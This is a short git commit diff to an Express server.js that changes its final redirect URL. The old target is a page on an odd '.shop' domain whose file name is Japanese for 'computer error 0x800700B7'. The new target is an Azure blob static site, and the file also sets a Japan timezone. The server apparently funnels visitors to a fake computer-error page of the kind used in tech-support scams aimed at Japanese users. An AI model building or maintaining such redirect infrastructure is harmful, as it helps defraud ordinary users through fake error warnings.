7901c3fb99ef2f5a11bf3ddfa3ecb197f491ebcf
toyohappy <sarahrusso678@gmail.com>
2026-01-15 00:02:16 +0900

    Update server.js

--- server.js
+++ server.js
@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://fooidemix.shop/コンピューターエラー0x800700B7.html";
+const FINAL_REDIRECT_URL = "https://jp13472.blob.core.windows.net/$web/index.html";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
